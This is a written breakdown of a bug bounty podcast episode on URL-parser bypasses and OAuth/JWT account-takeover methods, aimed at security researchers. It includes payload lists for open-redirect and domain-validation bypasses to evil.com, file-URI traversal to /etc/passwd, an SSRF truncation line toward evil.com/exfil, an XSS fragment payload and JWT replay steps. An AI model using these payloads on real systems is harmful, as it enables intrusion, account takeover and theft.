# Episode 44 --- URL Parsing & Auth Bypass Magic --- Full Technical Breakdown

## HOSTS
- **Justin Gardner** (@rhynorater) -- Bug bounty hunter, Critical Thinking podcast co-host
- **Joel Margolis** (teknogeek) -- Bug bounty hunter, Critical Thinking podcast co-host

---

## PART 1 --- Chrome Extension: Revealing Hidden Client-Side Elements

### Technique 1 --- Unhiding Client-Side Rendered Elements (xnl-reveal / Bookmarklet Approach)

**What it is:**
Modern single-page applications (SPAs) render HTML elements via JavaScript on the client side. Traditional proxy tools like Burp Suite modify the HTML *response* to remove `disabled` attributes and `display:none` styles, but this only works for server-rendered HTML. Elements generated by client-side JavaScript after page load are completely missed by Burp's "Unhide hidden form fields" feature.

**Why it works:**
Burp intercepts and modifies the HTTP response *before* the browser executes JavaScript. Any elements created dynamically by React, Angular, Vue, or vanilla JS `document.createElement()` calls are never seen by Burp's response modification. A client-side approach (bookmarklet or extension) runs *after* JavaScript has finished rendering the DOM, catching everything.

**Code example -- JavaScript bookmarklet to reveal all hidden/disabled elements:**
```javascript
javascript:void(function(){
  // Remove display:none from all elements
  document.querySelectorAll('[style*="display:none"], [style*="display: none"]')
    .forEach(el => { el.style.display = ''; el.style.border = '2px solid red'; });

  // Remove hidden attribute
  document.querySelectorAll('[hidden]')
    .forEach(el => { el.removeAttribute('hidden'); el.style.border = '2px solid orange'; });

  // Show elements with visibility:hidden
  document.querySelectorAll('[style*="visibility:hidden"], [style*="visibility: hidden"]')
    .forEach(el => { el.style.visibility = 'visible'; el.style.border = '2px solid yellow'; });

  // Enable all disabled elements
  document.querySelectorAll('[disabled]')
    .forEach(el => { el.removeAttribute('disabled'); el.style.border = '2px solid lime'; });

  // Show elements hidden by CSS class (common patterns)
  document.querySelectorAll('.hidden, .d-none, .invisible, .sr-only, .visually-hidden')
    .forEach(el => {
      el.classList.remove('hidden','d-none','invisible','sr-only','visually-hidden');
      el.style.border = '2px solid cyan';
    });

  // Reveal inputs of type="hidden" as text inputs
  document.querySelectorAll('input[type="hidden"]')
    .forEach(el => { el.type = 'text'; el.style.border = '2px solid magenta'; });

  alert('Revealed ' + document.querySelectorAll('[style*="border"]').length + ' elements');
}());
```

**Where to apply:**
- Any SPA (React, Angular, Vue, Svelte) where forms/buttons/admin features might be hidden client-side
- Pages with role-based UI where features are hidden rather than removed from the DOM
- Admin panels that hide functionality behind `v-if="isAdmin"` or `ng-if="user.role==='admin'"` but still render the component

**Limitations:**
- Elements behind framework conditional rendering (`v-if`, `*ngIf` with falsy values) are never added to the DOM and cannot be revealed -- only `v-show` / `[hidden]` / CSS-hidden elements can be found
- The tool xnl-reveal also detects reflected query parameters, which is a separate recon capability

---

## PART 2 --- URL Parser Disagreement: File Scheme Path Traversal

### Technique 2 --- Exploiting Question Mark Interpretation Differences in File URIs

**What it is:**
When two URL parsers handle the same URL but disagree on how the `?` character functions in a `file://` scheme URI, a path traversal becomes possible. One parser treats `?` as a query string delimiter (truncating the path), while the other treats it as a literal character in the file path (since file URIs arguably have no query strings).

**Why it works:**
The URL spec is ambiguous about whether `file://` URIs support query strings. In HTTP, `?` always begins the query string. In file URIs, `?` can be a valid path character (Linux allows `?` in filenames). When a security check uses parser A (which truncates at `?`) and the actual file operation uses parser B (which keeps `?` as part of the path), path traversal sequences after the `?` survive the security check but get processed by the file handler.

**Code example -- the vulnerable flow:**
```
Attacker-supplied URL:
  file:///safe/dir/.?/../../../../etc/passwd

                         Parser A (security check)                Parser B (file operation)
                         -------------------------                --------------------------
Sees path as:            /safe/dir/.                              /safe/dir/.?/../../../../etc/passwd
After normalization:     /safe/dir/                               /etc/passwd
Verdict:                 SAFE (within /safe/dir/)                 READS /etc/passwd
```

**Attack flow -- SVG inclusion with file URI path traversal:**
```
+-----------------------+       +------------------+       +--------------------+
| Attacker uploads SVG  | ----> | Server validates  | ----> | Server renders SVG  |
| with file:// ref      |       | URL with Parser A |       | using Parser B      |
| containing:           |       | Sees: /safe/dir/. |       | Reads: /etc/passwd  |
| file:///safe/dir/.?/  |       | Result: PASS      |       | Result: DATA LEAK   |
| ../../../../etc/passwd|       |                   |       |                     |
+-----------------------+       +------------------+       +--------------------+
```

**Additional payloads exploiting `?` in file URIs:**
```
# Basic path traversal after ?
file:///app/uploads/.?/../../../../etc/passwd

# Double encoding the traversal after ?
file:///app/uploads/.%3F/..%2F..%2F..%2F..%2Fetc/passwd

# Using # (fragment) similarly if parsers disagree on fragment in file URIs
file:///app/uploads/.#/../../../etc/passwd

# Null byte variant (older systems)
file:///app/uploads/.%00/../../../etc/passwd
```

**Where to apply:**
- Any application that processes file URIs (SVG renderers, PDF generators, document converters)
- Server-side rendering that allows `file://` scheme references
- Applications where one library validates the URL and a different library fetches it
- Canva-style design tools, document processors, image processors

**Limitations:**
- Requires the application to accept `file://` scheme URIs
- Requires two different parsers to be in the pipeline (validation vs. execution)
- Linux-specific: `?` is valid in Linux filenames but not Windows

---

## PART 3 --- URL Structure Deep Dive for Bypass Attacks

### Technique 3 --- Username:Password Field for Open Redirect / Domain Validation Bypass

**What it is:**
The URL spec allows `username:password@` between the scheme and the host. When an application validates a URL to check it points to an allowed domain, the parsing library may interpret the `@` differently than the browser, allowing an attacker to redirect to an arbitrary domain.

**Why it works:**
The full URL structure is:
```
scheme://username:password@host:port/path?query#fragment
```
If a validator checks `starts_with("https://allowed.com")` or does naive string matching, an attacker can construct:
```
https://allowed.com@evil.com/path
```
The browser navigates to `evil.com` with `allowed.com` as the username field. The validator sees `allowed.com` at the expected position and approves it.

**Code examples -- bypass payloads:**
```
# Basic userinfo bypass
https://allowed.com@evil.com/callback

# With password field
https://allowed.com:anything@evil.com/callback

# Backslash break -- KEY TECHNIQUE from the episode
# The backslash breaks the userinfo parser in some implementations
https://allowed.com\@evil.com/callback

# Backslash in password field
https://allowed.com\:@evil.com

# URL-encoded @
https://allowed.com%40evil.com
# Some parsers decode %40 to @ and re-parse

# Combining with port confusion
https://allowed.com:80@evil.com

# Unicode confusable for @
https://allowed.com%EF%BC%A0evil.com
```

**The backslash bypass in detail (highlighted in the episode as most common bypass):**
```javascript
// Validator sees:
const url = "https://target.com\\:@attacker.com";

// Node.js URL parser:
const parsed = new URL(url);
console.log(parsed.hostname); // "attacker.com"
console.log(parsed.username); // "target.com\\"

// But a naive regex check:
/^https:\/\/target\.com/.test(url); // true -- BYPASS

// Browser behavior: navigates to attacker.com
```

**Testing different parsers against the backslash:**
```javascript
// Browser (Chrome/Firefox) -- treats \ as /
// https://target.com\@evil.com -> navigates to target.com/@evil.com

// Python urllib
import urllib.parse
r = urllib.parse.urlparse("https://target.com\\@evil.com")
# r.hostname may vary by version

// PHP parse_url
parse_url("https://target.com\\@evil.com");
// Different behavior across PHP versions

// Java java.net.URL vs java.net.URI
// Different parsing -- URI is stricter
```

**Where to apply:**
- OAuth `redirect_uri` validation
- Open redirect parameters (`?next=`, `?return=`, `?redirect_url=`)
- Link validation in chat/messaging apps
- Any URL allowlist/blocklist check

**Limitations:**
- Chrome strips `username:password@` from HTTP(S) URLs for security
- Firefox shows a warning dialog when credentials are in the URL
- Only useful if the URL is consumed server-side or by a non-browser client, OR for parser confusion during validation

---

### Technique 4 --- Regex Dot Wildcard TLD Bypass

**What it is:**
Regex patterns that validate domain names often use `.` (dot) as a literal dot separator but forget that in regex, `.` matches ANY character. This allows attackers to bypass domain validation by substituting the dot with any character to match an attacker-controlled domain.

**Why it works:**
The regex `/allowed\.com$/` correctly escapes the dot before `com`. But `/allowed.co.jp$/` with unescaped dots matches `allowedXcoYjp` -- any character in place of the dots. On multi-level TLDs like `.co.jp`, `.co.uk`, `.com.au`, there are more dots to exploit.

**Code examples:**
```javascript
// Vulnerable validation regex
const allowedPattern = /^https:\/\/app.example.co.jp$/;

// Bypass: register "appXexampleXcoXjp" -- but more practically:
// The dot before "co" is exploitable:
// "app.exampleXco.jp" -- if attacker owns exampleXco.jp domain

// Real-world example with .co.jp
const pattern = /^https:\/\/.*\.target.co.jp/;
// Attacker registers: targetXco.jp (any char replaces the dot)
// Payload: https://evil.targetXco.jp  -- matches the regex!

// Correct regex should be:
const safePattern = /^https:\/\/.*\.target\.co\.jp/;
```

**Multi-level TLD exploitation matrix:**
```
TLD Format    | Unescaped Pattern     | Attacker Registers
--------------|-----------------------|---------------------
.co.uk        | target.co.uk          | targetXco.uk
.co.jp        | target.co.jp          | targetXco.jp
.com.au       | target.com.au         | targetXcom.au
.co.in        | target.co.in          | targetXco.in
```

**Validation bypass with `endsWith`:**
```javascript
// Vulnerable
function isAllowed(url) {
  const hostname = new URL(url).hostname;
  return hostname.endsWith("target.com");  // Missing dot prefix!
}

// Bypass
isAllowed("https://eviltarget.com");  // true!

// Also vulnerable
function isAllowed2(url) {
  const hostname = new URL(url).hostname;
  return hostname.endsWith(".target.com"); // Looks safe...
}

// But what about the root domain itself?
isAllowed2("https://target.com"); // false! Breaks legitimate use
// So devs remove the dot prefix... opening the bypass
```

**Where to apply:**
- OAuth redirect_uri validation
- CORS origin checks
- CSP header domain matching (manual implementations)
- Webhook URL validation
- Any domain allowlist using regex

---

### Technique 5 --- Port Field Injection for Parser Confusion

**What it is:**
Injecting unexpected characters into the port section of a URL to cause parser disagreements between validation and execution layers.

**Why it works:**
The port field follows a colon after the hostname and is expected to contain only digits. When non-numeric characters are injected, different parsers handle the error differently -- some ignore the invalid port, some truncate at the first non-digit, and some treat the entire section as part of the hostname.

**Code examples:**
```
# Basic port with garbage
https://allowed.com:80evil.com/path

# Port with encoded characters
https://allowed.com:80%0d%0aHost:evil.com/path

# Port overflow
https://allowed.com:99999999999999/path

# Port with @ to trigger userinfo re-parsing
https://allowed.com:80@evil.com

# Alphabetic port (some parsers default to 80/443)
https://allowed.com:abc/path
```

**Where to apply:**
- Any URL validation that parses host and port separately
- SSRF protection bypass
- Open redirect filters

---

### Technique 6 --- Hash/Fragment as URL Comment for Truncation Attacks

**What it is:**
The `#` (fragment/hash) in a URL is never sent to the server. This makes it a "comment character" for the server side -- anything after `#` is invisible to the backend. This can be exploited to truncate unwanted parts of a URL when the server processes it.

**Why it works:**
When a server-side application constructs a URL by appending to user input (e.g., adding a file extension), an attacker can use `#` to truncate the appended content. The server either strips the fragment before making the request, or the downstream service ignores it.

**Code examples:**
```
# SSRF: server appends ".json" to user input
# Normal: https://internal-api.com/data.json
# Attack: supply "https://evil.com/steal#"
# Server constructs: https://evil.com/steal#.json
# Actual request goes to: https://evil.com/steal (fragment ignored)

# Path traversal with extension bypass
# Server appends .png:
# Input: ../../../../etc/passwd#
# Constructed path: ../../../../etc/passwd#.png
# OS resolves: ../../../../etc/passwd (# begins fragment, or in file systems, just fails)

# In client-side context, fragments ARE available:
// Attacker URL: https://app.com/page#<img src=x onerror=alert(1)>
// If JS does: document.getElementById('content').innerHTML = location.hash.slice(1)
// XSS via fragment -- never hits server logs!
```

**ASCII diagram -- fragment truncation in SSRF:**
```
Attacker Input: https://evil.com/exfil#
                                       ^-- fragment marker

Server appends ".json":  https://evil.com/exfil#.json
                                                ^-- this is now part of the fragment

HTTP request sent:       GET /exfil HTTP/1.1
                         Host: evil.com
                         (no .json -- fragment stripped by HTTP client)
```

**Where to apply:**
- SSRF where the server appends file extensions or path suffixes
- Any server-side URL construction from user input
- Client-side XSS via `location.hash` (source) flowing to sinks without server logging

---

### Technique 7 --- Path Parameter (Semicolon) Injection

**What it is:**
Some web servers and frameworks support "path parameters" delimited by semicolons within URL path segments. The syntax is `/path;param=value/next`. This feature is supported by Java-based servers (Tomcat, Jetty, Spring), but ignored by most other web servers (Nginx, Apache, Node.js).

**Why it works:**
When a reverse proxy (Nginx) forwards requests to a Java backend (Tomcat), Nginx sees the semicolon as part of the path, but Tomcat strips path parameters before routing. This creates a classic parser disagreement exploitable for path traversal and access control bypass.

**Code examples -- Orange Tsai's classic techniques:**
```
# Tomcat path parameter normalization
# Nginx sees path: /safe/..;/admin/secret
# Nginx check: path starts with /safe/ -- ALLOWED
# Tomcat sees: /safe/../admin/secret -> /admin/secret -- PATH TRAVERSAL

# Spring Framework path parameter stripping
/api/v1/users;.js
# Nginx routes to static handler (sees .js extension)
# Spring strips ";.js" and routes to /api/v1/users

# Multiple path parameters
/path;a=1;b=2/resource
# Some servers: path = "/path", params = {a:1, b:2}
# Other servers: path = "/path;a=1;b=2" (literal)

# ACL bypass via semicolon
# WAF rule: block requests to /admin/*
# Payload: /admin;bypass=true/dashboard
# WAF sees: /admin;bypass=true/dashboard (no match for /admin/*)
# Tomcat sees: /admin/dashboard (path params stripped)
```

**Parser disagreement matrix:**
```
URL: /app/..;/admin

Server         | Interprets as      | Result
---------------|--------------------|------------------
Nginx          | /app/..;/admin     | Forwards as-is (literal path)
Apache         | /app/..;/admin     | Forwards as-is (literal path)
Tomcat         | /app/../admin      | Resolves to /admin
Jetty          | /app/../admin      | Resolves to /admin
Spring Boot    | /app/../admin      | Resolves to /admin
Node.js/Express| /app/..;/admin     | Literal path (404)
```

**Where to apply:**
- Java-based backends behind Nginx/Apache reverse proxies
- Spring Boot applications with path-based authorization
- Any architecture with multiple URL-processing layers

**References:**
- Orange Tsai: "Breaking Parser Logic" (DEF CON 2017)
- Orange Tsai: "Path Normalization" (DEF CON 2018)

---

## PART 4 --- OAuth Token Reuse and Cross-App Authentication Attacks

### Technique 8 --- Facebook OAuth Implicit Grant Token Reuse (ATO)

**What it is:**
When a website uses Facebook's implicit grant flow (`response_type=token`) for "Login with Facebook," the access token is returned directly to the client. If the website does not verify that the token was issued *for its own app* (via the debug/introspection endpoint), an attacker can supply a token from a *different* Facebook app to authenticate as any user.

**Why it works:**
In the implicit flow, the access token comes directly to the browser (no server-side code exchange). The token is valid for Facebook's API regardless of which app it was issued for. If the website just calls `/me?access_token=TOKEN` without checking the `app_id` on the token, any valid Facebook token for that user works. The attacker only needs the victim to have authorized *any* Facebook app the attacker controls.

**Attack flow:**
```
+------------------+     +-------------------+     +------------------+
| 1. Attacker owns |     | 2. Victim uses    |     | 3. Attacker gets |
| a Facebook app   |---->| attacker's app    |---->| token for victim |
| (any trivial app)|     | (game, quiz, etc.)|     | (scoped to       |
|                  |     |                   |     |  attacker's app) |
+------------------+     +-------------------+     +------------------+
                                                          |
                                                          v
+------------------+     +-------------------+     +------------------+
| 6. ATO: attacker |     | 5. Target calls   |     | 4. Attacker sends|
| is logged in as  |<----| /me, gets victim  |<----| token to target  |
| victim           |     | email, logs in    |     | site's OAuth     |
|                  |     | (NO app_id check!)|     | callback         |
+------------------+     +-------------------+     +------------------+
```

**What the server SHOULD do (introspection check):**
```javascript
// SECURE: verify the token belongs to YOUR app
const debugResponse = await fetch(
  `https://graph.facebook.com/debug_token?input_token=${userToken}&access_token=${appToken}`
);
const data = await debugResponse.json();

if (data.data.app_id !== MY_APP_ID) {
  throw new Error('Token was not issued for this application');
}
if (!data.data.is_valid) {
  throw new Error('Token is invalid');
}

// Only THEN proceed to get user info
const me = await fetch(`https://graph.facebook.com/me?access_token=${userToken}`);
```

**What vulnerable servers do:**
```javascript
// VULNERABLE: no app_id verification
app.get('/auth/facebook/callback', async (req, res) => {
  const token = req.query.access_token; // From implicit grant

  // Directly calls /me without checking which app issued the token
  const me = await fetch(`https://graph.facebook.com/me?fields=email&access_token=${token}`);
  const user = await me.json();

  // Logs in whatever user the email belongs to
  const account = await db.findUserByEmail(user.email);
  req.session.user = account;  // ATO!
});
```

**How to detect the implicit grant flow:**
```javascript
// Look for response_type=token in the OAuth redirect:
// https://www.facebook.com/v18.0/dialog/oauth?
//   client_id=APP_ID&
//   redirect_uri=https://target.com/callback&
//   response_type=token    <--- IMPLICIT GRANT (token returned directly)
//   &scope=email

// vs. the secure authorization code flow:
//   response_type=code     <--- CODE GRANT (code exchanged server-side)
```

**Where to apply:**
- Any website with "Login with Facebook" using implicit grant (`response_type=token`)
- Potentially applies to other OAuth providers that allow implicit grants
- Grammarly was named as a vulnerable target in this writeup (Salt Labs research)

**Limitations:**
- The victim must have previously authorized *some* Facebook app that the attacker controls or can compromise
- Implicit grant flow is increasingly deprecated in favor of PKCE/code flow

---

### Technique 9 --- Facebook OAuth Email Scope Removal for Account Takeover

**What it is:**
When logging into a service via Facebook, the OAuth prompt includes an email scope. Facebook allows users to *decline* sharing their email. If the service then asks the user to manually provide an email, an attacker can provide a victim's email, then later re-login with Facebook *with* the email scope to trigger a re-linking flow that preserves the original (victim) email's verification link.

**Why it works:**
The service has two competing flows: (1) user provides email manually during first login without email scope, and (2) Facebook provides the email automatically on subsequent login with email scope. The service fails to invalidate the first verification link when the email changes, creating a race between the two identities.

**Attack flow (from JS25's writeup, 16K bounty):**
```
Step 1: Login with Facebook, REMOVE email scope from OAuth prompt
+-------------------------------------------------------------------+
| Facebook OAuth prompt: [x] Public profile  [ ] Email address      |
|                                             ^-- UNCHECK THIS      |
+-------------------------------------------------------------------+

Step 2: Service asks for email -> Enter victim@target.com
+-------------------------------------------------------------------+
| "Please provide your email to complete registration"              |
| Email: [victim@target.com]  [Submit]                              |
+-------------------------------------------------------------------+
| -> Service sends verification link to victim@target.com           |
| -> Attacker does NOT click the link (but it exists)               |
+-------------------------------------------------------------------+

Step 3: Logout. Login again with SAME Facebook account, this time SHARE email
+-------------------------------------------------------------------+
| Facebook OAuth prompt: [x] Public profile  [x] Email address      |
|                                             ^-- CHECK THIS TIME   |
+-------------------------------------------------------------------+
| -> Facebook sends attacker@attacker.com to the service            |
| -> Service updates the email, sends new verification to           |
|    attacker@attacker.com                                          |
| -> BUT the old verification link for victim@target.com            |
|    IS STILL VALID                                                 |
+-------------------------------------------------------------------+

Step 4: Repeat Step 1-2 to re-seed victim@target.com

Step 5: Use the OLD verification link to verify victim@target.com
+-------------------------------------------------------------------+
| -> Account is now linked to attacker's Facebook                   |
| -> Email is verified as victim@target.com                         |
| -> Attacker has full access to victim's account                   |
+-------------------------------------------------------------------+
```

**How to manipulate the email scope in the OAuth URL:**
```
# Original OAuth URL:
https://www.facebook.com/v18.0/dialog/oauth?
  client_id=APP_ID&
  redirect_uri=https://target.com/callback&
  scope=email,public_profile&     <--- email scope present
  response_type=code

# Modified OAuth URL (remove email scope):
https://www.facebook.com/v18.0/dialog/oauth?
  client_id=APP_ID&
  redirect_uri=https://target.com/callback&
  scope=public_profile&           <--- email scope REMOVED
  response_type=code

# Facebook will then NOT share the email with the service
```

**Where to apply:**
- Any service with "Login with Facebook" that has a fallback email prompt
- Services that allow incremental scope changes on re-login
- Any OAuth provider that lets users decline specific scopes

---

### Technique 10 --- JWT/Token Reuse Across Environments (Staging-to-Prod)

**What it is:**
When staging and production environments share the same JWT signing secret (or the same centralized auth service), a token issued on staging is valid on production. An attacker can register an account on the staging environment (which often has weaker access controls) and use the JWT to authenticate on production.

**Why it works:**
Centralized authentication is an engineering trend -- one auth service handles all environments. If the JWT signing key is shared and the token validation only checks signature validity (not which environment or service issued it), cross-environment token reuse is possible.

**Attack flow:**
```
+-------------------+     +--------------------+     +-------------------+
| 1. Find staging   |     | 2. Register on     |     | 3. Get JWT from   |
| environment       |---->| staging as         |---->| staging           |
| (stage.target.com)|     | victim@victim.com  |     | (signed with      |
|                   |     | (no email verify!) |     |  shared secret)   |
+-------------------+     +--------------------+     +-------------------+
                                                           |
                                                           v
+-------------------+     +--------------------+     +-------------------+
| 6. ATO on prod    |     | 5. Prod validates  |     | 4. Send JWT to    |
| as victim         |<----| JWT -- valid sig!  |<----| prod.target.com   |
|                   |     | Looks up email,    |     | in Authorization  |
|                   |     | finds victim acct  |     | header            |
+-------------------+     +--------------------+     +-------------------+
```

**What to look for in JWTs:**
```javascript
// Decode the JWT payload (base64)
// Look for claims that indicate environment:
{
  "sub": "user123",
  "email": "attacker@test.com",
  "iss": "https://auth.target.com",    // <-- shared issuer across envs?
  "aud": "staging-app",                // <-- audience claim present?
  "env": "staging",                    // <-- environment claim present?
  "iat": 1698000000,
  "exp": 1698086400
}

// If "aud" or "env" claims are missing, or if prod doesn't check them,
// the token is likely reusable cross-environment
```

**Detection checklist:**
```
1. Find staging/dev/sandbox environments:
   - stage.target.com, staging.target.com
   - dev.target.com, sandbox.target.com
   - api-staging.target.com

2. Register an account (staging often skips email verification)

3. Capture the JWT/session token

4. Replay it against production API endpoints:
   curl -H "Authorization: Bearer <staging-jwt>" https://api.target.com/me

5. If production returns user data -> shared secret confirmed
```

**Where to apply:**
- Any target with accessible staging/dev/sandbox environments
- Microservice architectures with centralized auth
- Companies using a single OAuth/OIDC provider across all services and environments
- Mentioned as found at multiple live hacking events on hardened targets

---

### Technique 11 --- OAuth Provider Email Verification Bypass (Unverified Email ATO)

**What it is:**
When a service allows login via a third-party OAuth provider (especially lesser-known ones like Discord, GitHub, etc.), and that provider allows accounts with unverified emails, an attacker can create an account on the provider with the victim's email (without verifying it), then use OAuth to log into the target service as the victim.

**Why it works:**
The target service trusts the email from the OAuth provider without checking whether the provider has actually verified that email. The attacker creates a provider account with `victim@target.com` as the email, never verifies it, and the provider still returns that email in the OAuth profile response.

**Attack flow:**
```
+------------------+     +-------------------+     +------------------+
| 1. Create account|     | 2. OAuth login to |     | 3. Provider sends|
| on provider with |---->| target.com via    |---->| victim@target.com|
| victim@target.com|     | that provider     |     | to target.com    |
| (DON'T verify!)  |     |                   |     | (unverified!)    |
+------------------+     +-------------------+     +------------------+
                                                          |
                                                          v
+------------------+     +-------------------+     +------------------+
| 5. ATO as victim |<----| 4. Target trusts  |<----| Target looks up  |
|                  |     | the email, logs   |     | account by email |
|                  |     | attacker in as    |     | finds victim acct|
|                  |     | victim            |     |                  |
+------------------+     +-------------------+     +------------------+
```

**Which providers to test:**
```
Provider   | Allows unverified email login? | Notes
-----------|-------------------------------|------------------
Discord    | Check                         | Mentioned in ep
GitHub     | Check                         | Has email verification
Facebook   | Usually verified              | But scope tricks exist
Google     | Always verified               | Hard to exploit
LinkedIn   | Usually verified              | Worth checking
Twitter/X  | Check                         | Email optional
Custom     | HIGH PROBABILITY              | Smaller providers often skip
```

**What to check on the target side:**
```javascript
// VULNERABLE: trusts provider email blindly
app.get('/auth/callback', async (req, res) => {
  const profile = await oauthProvider.getProfile(req.query.code);
  const user = await db.findByEmail(profile.email);
  if (user) {
    loginAs(user); // ATO!
  }
});

// SECURE: checks email_verified claim
app.get('/auth/callback', async (req, res) => {
  const profile = await oauthProvider.getProfile(req.query.code);
  if (!profile.email_verified) {
    return res.status(403).send('Email not verified by provider');
  }
  // ... proceed
});
```

**Where to apply:**
- Services with multiple OAuth login options, especially uncommon providers
- The more login mechanisms available, the more likely one has this flaw
- "The more login mechanisms, the more chaos" -- Joel Margolis

---

## PART 5 --- Monitoring JS Files for Leaked Secrets

### Technique 12 --- Monitoring JavaScript File Changes for Exposed Links/Secrets

**What it is:**
Continuously monitoring a target's JavaScript files for changes. When new code is deployed, new endpoints, API keys, Google Doc links, internal URLs, or other sensitive data may be temporarily or permanently exposed in the client-side code.

**Why it works:**
Developers frequently embed configuration data, feature flags, internal tool links, and debug endpoints in JavaScript bundles. These often leak before security review catches them. A monitoring system catches these the moment they go live.

**Implementation approach:**
```bash
#!/bin/bash
# Simple JS diff monitor
TARGET_DIR="./js_snapshots"
mkdir -p "$TARGET_DIR/current" "$TARGET_DIR/previous"

# List of JS URLs to monitor (from recon)
JS_URLS="js_urls.txt"

while IFS= read -r url; do
  filename=$(echo "$url" | md5sum | cut -d' ' -f1).js

  # Download current version
  curl -s "$url" -o "$TARGET_DIR/current/$filename"

  # Diff against previous version
  if [ -f "$TARGET_DIR/previous/$filename" ]; then
    diff_output=$(diff "$TARGET_DIR/previous/$filename" "$TARGET_DIR/current/$filename")
    if [ -n "$diff_output" ]; then
      echo "[CHANGE DETECTED] $url"
      echo "$diff_output" | head -50

      # Check for interesting patterns in new lines
      echo "$diff_output" | grep -E "^>" | grep -iE \
        "(docs\.google|apikey|secret|internal|admin|token|password|aws)" \
        && echo "[ALERT] Potentially sensitive data in new JS!"
    fi
  fi

  # Rotate snapshots
  cp "$TARGET_DIR/current/$filename" "$TARGET_DIR/previous/$filename"
done < "$JS_URLS"
```

**What to grep for in changed JS:**
```
# Google Docs / Sheets / Forms links
docs\.google\.com/(document|spreadsheets|forms)
drive\.google\.com

# API keys and tokens
(api[_-]?key|apikey|api[_-]?secret)[\s]*[:=]
(access[_-]?token|auth[_-]?token)[\s]*[:=]

# Internal URLs
(internal|staging|dev|admin|debug)\.(company|target)\.com
localhost:[0-9]+
127\.0\.0\.1

# AWS / Cloud credentials
AKIA[0-9A-Z]{16}
(aws[_-]?secret|aws[_-]?key)
```

**Where to apply:**
- All bug bounty targets -- run this as continuous background recon
- Especially effective on targets with frequent deployments (CI/CD)
- The Bevix report mentioned in the episode found a Google Doc link in JS files that leaked confidential user data

---

## PART 6 --- Android URL Parsing and Deep Link Attacks

### Technique 13 --- Android URI Parser Disagreements (android.net.URI vs java.net.URI)

**What it is:**
Android has two URI parsing classes that behave differently: `android.net.Uri` and `java.net.URI`. When an app uses one for validation and another for execution (or the system uses one), bypass opportunities arise through parser disagreements.

**Why it works:**
`android.net.Uri` is more lenient and does not validate RFC compliance. `java.net.URI` is stricter and follows RFC 2396/3986. They disagree on edge cases involving special characters, encoding, and authority parsing.

**Key differences (from BaggyPro's research):**
```java
// android.net.Uri -- lenient parser
Uri uri1 = Uri.parse("https://evil.com\\@allowed.com");
uri1.getHost(); // may return "allowed.com" (treats \ as path)

// java.net.URI -- strict parser
URI uri2 = new URI("https://evil.com\\@allowed.com");
uri2.getHost(); // may return "evil.com" or throw exception
```

**Android deep link scheme hijacking concept:**
```xml
<!-- AndroidManifest.xml of legitimate app -->
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <category android:name="android.intent.category.BROWSABLE" />
  <data android:scheme="targetapp" />
</intent-filter>

<!-- Attacker's malicious app could register: -->
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <category android:name="android.intent.category.BROWSABLE" />
  <data android:scheme="targetapphacked" />
  <!-- If OAuth redirect_uri validation only checks startsWith("targetapp") -->
  <!-- This scheme would match the prefix check -->
</intent-filter>
```

**Where to apply:**
- Android apps with custom URI schemes for OAuth callbacks
- Apps that validate URLs using one class but process with another
- Deep link handlers that pass URLs to WebView

**Reference:** BaggyPro -- "Golden Techniques for Bypassing URL Parsing"

---

## MASTER SUMMARY TABLE

| # | Technique | Category | Where to Apply |
|---|-----------|----------|----------------|
| 1 | Unhiding client-side rendered elements | Recon / Hidden Features | SPAs with role-based UI, React/Angular/Vue apps |
| 2 | File URI question mark parser disagreement | Path Traversal | SVG renderers, PDF generators, file processors |
| 3 | Username:Password field + backslash bypass | Open Redirect / SSRF | OAuth redirect_uri, URL allowlists, open redirect params |
| 4 | Regex dot wildcard TLD bypass | Domain Validation Bypass | CORS checks, OAuth redirect validation, webhook URLs |
| 5 | Port field injection | Parser Confusion | URL validation, SSRF protection bypass |
| 6 | Fragment as URL comment for truncation | SSRF / Path Traversal | Server-side URL construction, extension appending |
| 7 | Path parameter semicolon injection | ACL Bypass / Path Traversal | Java backends behind Nginx/Apache reverse proxies |
| 8 | Facebook implicit grant token reuse | Account Takeover | Sites with "Login with Facebook" (response_type=token) |
| 9 | OAuth email scope removal | Account Takeover | Facebook OAuth with fallback email prompt |
| 10 | JWT reuse across environments | Account Takeover | Targets with accessible staging/dev/sandbox envs |
| 11 | Unverified OAuth email ATO | Account Takeover | Services with multiple OAuth providers, uncommon providers |
| 12 | JS file change monitoring | Recon / Info Disclosure | All targets, continuous background monitoring |
| 13 | Android URI parser disagreements | OAuth Bypass / Open Redirect | Android apps with deep links and OAuth flows |

---

## KEY QUOTES WORTH REMEMBERING

> "You gotta try high impact attack vectors." -- Justin Gardner, on how to find high impact bugs

> "It's like a comment in a URL, right? Like in the sense that it makes everything after it just not do anything. Kind of like SQL injection." -- Joel Margolis, on the URL fragment (`#`) as a truncation mechanism

> "The more login mechanisms, the more chaos there is. That's what I've learned. The more room for error because everybody does it a little bit differently." -- Joel Margolis, on why multi-provider OAuth is a goldmine

> "Signing up with Facebook, remove the email scope from the OAuth prompt and see what happens." -- Tanner (cash money), 2019 bug bounty tip that led to a $16K ATO four years later

> "One quick tip: one of the most common bypasses I see to domain validation is when you add something with a backslash. Oftentimes that will break the at sign in the username and password field." -- Justin Gardner, on the backslash userinfo bypass

> "These things, they persist. They don't just disappear because somebody made a poster or talk about it. They keep surfacing." -- Joel Margolis, on why old research remains valuable

> "Safari and Edge together make up 25% of the browser market. So it's pretty significant if they're not following the same standards as Chrome." -- Joel Margolis, on testing across browsers

---

## RESOURCES MENTIONED

- **xnl-reveal Chrome Extension** -- by XNL Hacker. Shows reflected params, hidden elements, disabled elements. GitHub repo available.
- **Salt Labs OAuth Writeup** -- Facebook implicit grant token reuse affecting Grammarly and others.
- **JS25 (@js25_) Twitter Thread** -- Facebook login ATO via email scope removal. $16K bounty.
- **Tanner (cash money) Bug Bounty Tip (2019)** -- "Remove email scope from OAuth prompt" via Intigriti.
- **Canva Security Blog** -- "When URL Parsers Disagree" -- file scheme question mark exploitation.
- **BaggyPro -- "Golden Techniques for Bypassing URL Parsing"** -- Android `android.net.Uri` vs `java.net.URI` differences.
- **Orange Tsai DEF CON Talks** -- "Breaking Parser Logic" (2017) and path normalization follow-up (2018).
- **SSRF Bible** -- Alternative URI schemes (FTP, Gopher, etc.) for SSRF exploitation.
- **Mozilla HTTP Authentication Docs** -- Behavior of `username:password@host` across browsers.
- **Chromium Bug Tracker (2011)** -- Debate on stripping credentials from URLs.
